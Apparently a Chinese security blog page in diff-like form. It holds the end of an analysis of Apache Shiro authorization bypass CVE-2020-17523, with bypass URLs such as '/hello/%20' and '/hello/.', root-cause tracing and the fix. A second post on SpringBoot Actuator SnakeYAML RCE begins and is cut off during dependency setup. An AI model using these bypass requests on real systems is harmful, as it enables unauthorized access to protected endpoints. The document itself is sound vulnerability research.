+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631017071477-240b1685-4392-4189-9005-958d8ab598a6.png" alt="img"></p>
+<p>核心逻辑均在新增的类org.apache.shiro.web.filter.InvalidRequestFilter中：<a target="_blank" rel="noopener" href="https://shiro.apache.org/static/1.6.0/apidocs/org/apache/shiro/web/filter/InvalidRequestFilter.html">https://shiro.apache.org/static/1.6.0/apidocs/org/apache/shiro/web/filter/InvalidRequestFilter.html</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631016949953-06a618cd-7d58-470b-b248-c494fc7cfe09.png" alt="img"></p>
+<h1 id="shiro权限绕过-CVE-2020-17523"><a href="#shiro权限绕过-CVE-2020-17523" class="headerlink" title="shiro权限绕过 CVE-2020-17523"></a>shiro权限绕过 CVE-2020-17523</h1><h2 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h2><p>Apache Shiro &lt; 1.7.1</p>
+<p>controller需为类似”/hello/{page}”的方式</p>
+<h2 id="利用过程-3"><a href="#利用过程-3" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>1、<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/test">http://127.0.0.1:9091/hello/test</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631017977165-d54f4233-14af-4e29-8d1a-9a8f90ec19f1.png" alt="img"></p>
+<p>2、<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/">http://127.0.0.1:9091/hello/%20</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631017989869-461680d9-2844-4576-aa34-8bf6c36856e1.png" alt="img"></p>
+<h3 id="西式句号-全路径绕过"><a href="#西式句号-全路径绕过" class="headerlink" title="西式句号 全路径绕过"></a>西式句号 全路径绕过</h3><p>需配置开启全路径匹配：</p>
+<p>1、<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/">http://127.0.0.1:9091/hello/</a>.</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631032985598-c1571efc-1430-4ec5-8569-13b46c2e000b.png" alt="img"></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="空格绕过-1"><a href="#空格绕过-1" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>当发起<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/">http://127.0.0.1:9091/hello/%20</a>请求时，</p>
+<p>首先经过容器URL解码，/hello/%20 –&gt; /hello/空格</p>
+<p>发现在shiro进行匹配过程中，/hello/* 和 /hello/空格 不匹配：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631031284766-7164c5c7-22c1-4dfa-9f44-ad509acc3ea1.png" alt="img"></p>
+<p>在org.apache.shiro.util.AntPathMatcher#doMatch函数中，/hello/* 和 /hello/空格 经过<em>tokenizeToStringArray</em>函数处理后的结果中/hello空格仅剩/hello：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631030626922-0b1a9ad0-4566-4348-b292-5fa49af55b7b.png" alt="img"></p>
+<p>跟进<em>tokenizeToSt**ringArray</em>方法可知，调用过程中，trimTokens参数值为true：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631030678981-ed418be6-7f82-40bf-a5fa-0b4ba1f73d4b.png" alt="img"></p>
+<p>而当trimTokens为true时，则会调用trim()，此时/hello/后面的空格将会被丢弃：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631030734899-ac7be7be-06e1-430a-af66-acd42f6f15b3.png" alt="img"></p>
+<p>在接下来的判断过程中，匹配结果为false，即/hello/* 和 /hello/空格 不匹配从而导致shiro的权限绕过：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631031176098-38e463df-f41a-47c9-9ee8-7de8e5c35d6b.png" alt="img"></p>
+<h3 id="西式句号-全路径绕过-1"><a href="#西式句号-全路径绕过-1" class="headerlink" title="西式句号 全路径绕过"></a>西式句号 全路径绕过</h3><p>当请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/.%E6%97%B6%EF%BC%8C">http://127.0.0.1:9091/hello/.时，</a></p>
+<p>首先经过org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getPathWithinApplication处理时，会被<em>normalize</em>函数将/hello/.最后面的 . 删除掉，最终requestURI为/hello/：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631033732679-a4573a8c-d7bd-4a66-870b-88150f854011.png" alt="img"></p>
+<p>在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain处理过程中，由于此时requestURI以/结尾，则将会把最后一个/删除，变成/hello：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631031744667-66687cb2-cbb1-4b5d-be6c-dfec6b0d648a.png" alt="img"></p>
+<p>而/hello和/hello/*不匹配导致shiro权限绕过：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631032096847-7a430343-9821-4683-ae80-09d9a11988b6.png" alt="img"></p>
+<p>但是，此时SpringMVC进行controller解析时，请求路径为/hello/%2e，spring中.和/默认是作为路径分割符的，不会参与到路径匹配，此时将解析controller失败，返回404:</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631032525802-e06e9e7d-8f38-4801-bd27-dba6f81bc6fb.png" alt="img"></p>
+<p>即，虽然绕过了shiro的权限校验，但默认无法解析到controller，也就无法执行想要的service；</p>
+<p>特殊情况：</p>
+<p>当手工配置开启springboot的全路径匹配时，可成功执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开启全路径匹配</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> <span class="keyword">extends</span> <span class="title">SpringBootServletInitializer</span> <span class="keyword">implements</span> <span class="title">BeanPostProcessor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title">configure</span><span class="params">(SpringApplicationBuilder builder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(Application.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> RequestMappingHandlerMapping) &#123;</span><br><span class="line">            ((RequestMappingHandlerMapping) bean).setAlwaysUseFullPath(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">postProcessAfterInitialization</span><span class="params">(Object bean, String beanName)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631032729912-0ed6f6cf-5e47-43fb-97f4-52bd13eedd7e.png" alt="img"></p>
+<h2 id="修复方式-3"><a href="#修复方式-3" class="headerlink" title="修复方式"></a>修复方式</h2><p>1、将tokenizeToStringArray函数的trimTokens参数设置为false，防止空格被抛弃：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631029386444-c211b447-fd1e-431f-afa8-bb5a2598b112.png" alt="img"></p>
+<p>2、将剔除结尾/的过程移到匹配的下方：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631033244890-a4a94396-3bb2-4880-af91-b22c15d828b0.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631033830623-14cd2689-3898-4e84-ac70-29ab899bbdb9.png" alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>开头所说的利用分号绕过了nginx的403屏蔽，请求到springboot项目后携带分号解析成功，而当使用了shiro 1.6.0后，url中携带分号则直接报错400，原因就很清晰了，因为在1.6.0中增加了org.apache.shiro.web.filter.InvalidRequestFilter类，其中会判断请求中包含分号时响应400状态码；</p>
+<p>shiro的权限绕过，本质还是shiro对uri的解析规则和后端开发框架的解析规则不一样所导致。</p>
+<h1 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a>巨人的肩膀</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://shiro.apache.org/static/1.6.0/apidocs/org/apache/shiro/web/filter/InvalidRequestFilter.html">https://shiro.apache.org/static/1.6.0/apidocs/org/apache/shiro/web/filter/InvalidRequestFilter.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df">https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">https://shiro.apache.org/security-reports.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/jweny/shiro-cve-2020-17523">https://github.com/jweny/shiro-cve-2020-17523</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000039703198">https://segmentfault.com/a/1190000039703198</a></p>
+</li>
+<li><p>……</p>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttestoo.github.io/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avator.jpg">
+      <meta itemprop="name" content="ttestoo">
+      <meta itemprop="description" content="不争">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ttestoo's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">SpringBoot Actuator SnakeYAML RCE漏洞分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-19 20:02:37" itemprop="dateCreated datePublished" datetime="2021-08-19T20:02:37+08:00">2021-08-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-21 17:48:27" itemprop="dateModified" datetime="2021-12-21T17:48:27+08:00">2021-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Java-Sec/" itemprop="url" rel="index"><span itemprop="name">Java Sec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近期公网监控过程中又发现存在actuator组件开放的情况，且env端点发现存在SnakeYAML依赖，由于业务重要性较低，为判断能否通过此问题进一步深入到内部，尝试借用SnakeYAML依赖获取服务端权限，失败了……</p>
+<p>下面对actuator+SnakeYAML rce利用进行记录分析。</p>
+<blockquote>
+<p>文章首发于安全客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254629">https://www.anquanke.com/post/id/254629</a></p>
+</blockquote>
+<h1 id="SnakeYAML使用"><a href="#SnakeYAML使用" class="headerlink" title="SnakeYAML使用"></a>SnakeYAML使用</h1><p>是Java用于解析yaml格式数据的类库, 它提供了dump()将java对象转为yaml格式字符串，load()将yaml字符串转为java对象；</p>
+<p>创建一个User类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>snakeyaml序列化、反序列化测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SnakeYamlTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 序列化测试</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">20</span>);</span><br><span class="line">        Yaml yaml1 = <span class="keyword">new</span> Yaml();</span><br><span class="line">        String dump1 = yaml1.dump(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;snakeyaml序列化测试：&quot;</span>);</span><br><span class="line">        System.out.println(dump1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化测试</span></span><br><span class="line">        String dump2 = <span class="string">&quot;!!com.ttestoo.snakeyaml.demo.User &#123;age: 30, name: admin&#125;&quot;</span>;</span><br><span class="line">        Yaml yaml2 = <span class="keyword">new</span> Yaml();</span><br><span class="line">        Object load = yaml2.load(dump2);</span><br><span class="line">        System.out.println(<span class="string">&quot;snakeyaml反序列化测试：&quot;</span>);</span><br><span class="line">        System.out.println(load.getClass());</span><br><span class="line">        System.out.println(load);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000125181.png" alt="image-20210820000125181"></p>
+<h1 id="Actuator-env说明"><a href="#Actuator-env说明" class="headerlink" title="Actuator env说明"></a>Actuator env说明</h1><p>1、actuator组件的/env端点是否支持POST请求？</p>
+<p>这个问题困扰了挺久，google搜了很多最终还是回到了官方文档，结论如下：</p>
+<p>springboot的/env本身是只读的，是否能post是springcloud的扩展！！！项目作者在GitHub回复如下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-boot/issues/20509">https://github.com/spring-projects/spring-boot/issues/20509</a></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000402487.png" alt="image-20210820000402487"></p>
+<p>而且翻了springboot多个1.x和2.x的官方文档，均未提及env端点能post请求改变环境变量：</p>
+<p>官方文档地址如下，改版本号即可：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/1.4.7.RELEASE/reference/htmlsingle/#production-ready-endpoints">https://docs.spring.io/spring-boot/docs/1.4.7.RELEASE/reference/htmlsingle/#production-ready-endpoints</a></p>
+<p>所有版本文档：<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/">https://docs.spring.io/spring-boot/docs/</a></p>
+<p>2.2.5版本 actuator api文档如下：</p>
+<p>文档中仅说明可GET请求，并未提及可POST请求！！！</p>
+<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/actuator-api//html/#env">https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/actuator-api//html/#env</a></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000602736.png" alt="image-20210820000602736"></p>
+<p>根据github上springboot作者提示，继续翻springcloud官方文档，证明在springcloud的spring-cloud-context模块中对env进行了扩展，支持post请求：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints%EF%BC%88%E8%BF%99%E9%87%8C%E4%BB%A52.1.3%E7%89%88%E6%9C%AC%E4%B8%BA%E4%BE%8B%EF%BC%89">https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints（这里以2.1.3版本为例）</a></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000627174.png" alt="image-20210820000627174">    </p>
+<p>2、那么实际利用过程中为啥有时post请求报错405呢？</p>
+<p>继续查询springcloud项目文档，spring cloud所有版本文档：<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-cloud/docs/%EF%BC%9B">https://docs.spring.io/spring-cloud/docs/；</a></p>
+<p>发现在Spring Cloud Hoxton Service Release 3 (SR3)的更新公告中，env端点默认不可写即post请求，可通过management.endpoint.env.post.enabled=true配置开启env端点的post请求：</p>
+<p><a target="_blank" rel="noopener" href="https://spring.io/blog/2020/03/05/spring-cloud-hoxton-service-release-3-sr3-is-available">https://spring.io/blog/2020/03/05/spring-cloud-hoxton-service-release-3-sr3-is-available</a></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000729126.png" alt="image-20210820000729126">    </p>
+<p>继续查看Spring Cloud Hoxton Service Release 3 (SR3)的更新公告，可得知Hoxton.SR3基于Spring Boot 2.2.5.RELEASE构建：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000740760.png" alt="image-20210820000740760">    </p>
+<p>在最下方可看到Hoxton.SR3版本对应的Spring Cloud Config组件版本为2.2.2.RELEASE：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000754259.png" alt="image-20210820000754259">    </p>
+<p>那么为什么Spring Cloud Config组件和Spring Cloud context模块又有什么关系呢？</p>
+<p>查看spring-cloud-config 2.2.2.RELEASE代码，其中pom.xml中包含spring-cloud-context 2.2.2.RELEASE依赖：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000814423.png" alt="image-20210820000814423">    </p>
+<p>也就是说项目中引入了spring-cloud-starter-config 2.2.2.RELEASE也就包含了 spring-cloud-context 2.2.2.RELEASE，<strong>这就是为什么针对actuator rce利用环境中引入spring-cloud-starter-config组件或者指定spring-cloud-dependencies版本为Hoxton.SR1的原因！！！</strong></p>
+<p>且这里已对spring-cloud-starter-config 2.2.1.RELEASE版本进行验证，Hoxton.SR3版本对应的spring-cloud-context也为2.2.2.RELEASE；</p>
+<p>总结，在spring cloud Hoxton.SR3开始（基于Spring Boot 2.2.5.RELEASE构建，其中spring-cloud-context或者spring-cloud-starter-config为2.2.2.RELEASE版本），需要配置management.endpoint.env.post.enabled=true才可post访问env端点。</p>
+<p>实际验证：</p>
+<p>(1) 当引入spring-cloud-starter-config或spring-cloud-context 2.2.1.RELEASE时:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.1</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.1</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不用手工单独配置management.endpoint.env.post.enabled=true即可进行post请求：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820000940411.png" alt="image-20210820000940411"></p>
+<p>(2) 当引入spring-cloud-starter-config或spring-cloud-context 2.2.2.RELEASE时：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span 